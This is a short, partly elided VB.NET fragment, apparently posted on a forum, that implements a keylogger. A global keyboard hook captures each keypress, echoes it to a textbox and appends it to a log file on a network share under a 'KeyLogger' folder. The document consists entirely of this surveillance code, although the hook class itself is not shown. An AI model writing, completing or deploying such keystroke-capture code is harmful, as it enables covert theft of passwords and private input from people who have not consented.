Public Class Form1
    ...
    Private WithEvents kbHook As New KeyboardHookA

    Private Sub kbHook_KeyDown(ByVal Key As System.Windows.Forms.Keys) Handles kbHook.KeyDown
        Dim Writer As New System.IO.StreamWriter("\\EVERT\Public\KeyLogger\Log.txt")
        ...
        Select Case Key
            ...
            Case Else
                TextBox1.AppendText(Chr(Key))
        End Select

        Writer.Write(Chr(Key))
        Writer.Close()
    End Sub
End Class
